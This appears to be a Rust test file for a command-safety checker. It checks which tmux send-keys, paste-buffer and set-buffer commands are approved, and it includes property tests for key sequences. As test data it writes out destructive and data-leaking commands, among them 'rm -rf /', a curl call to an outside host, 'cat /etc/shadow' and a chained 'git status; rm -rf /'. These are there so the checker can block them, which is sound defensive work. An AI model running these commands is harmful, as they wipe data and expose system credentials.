use crate::is_safe_command;
use crate::verdict::{SafetyLevel, Verdict};
use proptest::prelude::*;

fn verdict(cmd: &str) -> Verdict {
    crate::command_verdict(cmd)
}

#[test]
fn keys_that_type_nothing_are_approved() {
    for cmd in [
        "tmux send-keys", "tmux send-keys -t work C-c", "tmux send-keys Escape", "tmux send -t work:1.0 Left Right",
        "tmux send-keys PageUp PageDown Home End", "tmux send-keys -N 3 Left", "tmux send-keys -t work escape",
    ] {
        assert_eq!(verdict(cmd), Verdict::Allowed(SafetyLevel::SafeWrite), "{cmd}");
    }
}

#[test]
fn typed_text_is_approved_only_as_an_approved_command_it_submits() {
    for cmd in ["tmux send-keys -t work 'git status' Enter", "tmux send-keys 'ls -la' C-m", "tmux send -t w 'git log' Enter C-c"] {
        assert!(is_safe_command(cmd), "{cmd}");
    }
    for cmd in [
        "tmux send-keys -t work 'rm -rf /' Enter",
        "tmux send-keys 'rm -rf /' C-m",
        "tmux send-keys 'rm -rf /' C-j",
        "tmux send-keys 'rm -rf /' KPEnter",
        "tmux send-keys 'curl -s https://example.com/$HOME' Enter",
        "tmux send-keys 'git status; rm -rf /' Enter",
        "tmux send-keys 'rm -rf /\n'",
        "tmux send-keys 'ls'",
        "tmux send-keys 'ls' Up Enter",
        "tmux send-keys 'rm -rf ' '/' Enter",
        "tmux send-keys Enter",
        "tmux send-keys Up Enter",
        "tmux send-keys Up",
        "tmux send-keys -t work Down",
        "tmux send-keys C-r",
        "tmux send-keys C-y",
        "tmux send-keys -l 'rm -rf /'",
        "tmux send-keys -l 'git status'",
        "tmux send-keys -H 72 6d",
        "tmux send-keys -X copy-pipe 'rm -rf /'",
        "tmux send-keys -F '#{pane_id}'",
        "tmux send-keys C-o",
        "tmux send-keys C-x C-e",
        "tmux send-keys M-Enter",
        "tmux send-keys Tab",
        "tmux send-keys F5",
        "tmux send-keys -t",
        "tmux send-keys Escape '.' Enter",
        "tmux send-keys Home 'ls' Enter",
        "tmux send-keys 'git log' Enter Escape 'ls' Enter",
        "tmux send-keys 'ls\t' Enter",
        "tmux send-keys -K Escape",
        "tmux send-keys -K 'ls' Enter",
        "tmux send-prefix",
        "tmux paste-buffer -t work",
        "tmux pasteb",
        "tmux set-buffer 'rm -rf /'",
        "tmux setb x",
        "tmux load-buffer ./x",
    ] {
        assert!(!is_safe_command(cmd), "{cmd}");
    }
}

#[test]
fn key_names_match_without_regard_to_case() {
    assert!(!is_safe_command("tmux send-keys 'rm -rf /' enter"));
    assert!(!is_safe_command("tmux send-keys 'rm -rf /' c-m"));
    assert!(is_safe_command("tmux send-keys ESCAPE"));
}

const NAVIGATION: &[&str] = &["Left", "Right", "Home", "End", "PageUp", "PageDown", "Escape", "C-c"];
const SUBMIT: &[&str] = &["Enter", "C-m", "C-j", "KPEnter"];
const TYPED: &[&str] = &["git status", "ls -la", "rm -rf /", "curl -s https://example.com/$HOME", "cat /etc/shadow", "sh ./x"];

proptest! {
    #[test]
    fn navigation_alone_is_always_approved(keys in prop::collection::vec(prop::sample::select(NAVIGATION), 0..6)) {
        let cmd = format!("tmux send-keys -t work {}", keys.join(" "));
        prop_assert_eq!(verdict(&cmd), Verdict::Allowed(SafetyLevel::SafeWrite), "{}", cmd);
    }

    #[test]
    fn submitted_text_is_never_more_permissive_than_running_it(
        after in prop::collection::vec(prop::sample::select(NAVIGATION), 0..3),
        text in prop::sample::select(TYPED),
        submit in prop::sample::select(SUBMIT),
    ) {
        let cmd = format!("tmux send-keys -t work {} {submit} {}", shell_words::quote(text), after.join(" "));
        let typed = verdict(text);
        if typed.is_allowed() {
            prop_assert_eq!(verdict(&cmd), typed.combine(Verdict::Allowed(SafetyLevel::SafeWrite)), "{}", cmd);
        } else {
            prop_assert!(!verdict(&cmd).is_allowed(), "{}", cmd);
        }
    }

    #[test]
    fn text_left_unsubmitted_is_refused(
        text in prop::sample::select(TYPED),
        after in prop::collection::vec(prop::sample::select(NAVIGATION), 0..3),
    ) {
        let cmd = format!("tmux send-keys -t work {} {}", shell_words::quote(text), after.join(" "));
        prop_assert!(!verdict(&cmd).is_allowed(), "{}", cmd);
    }
}
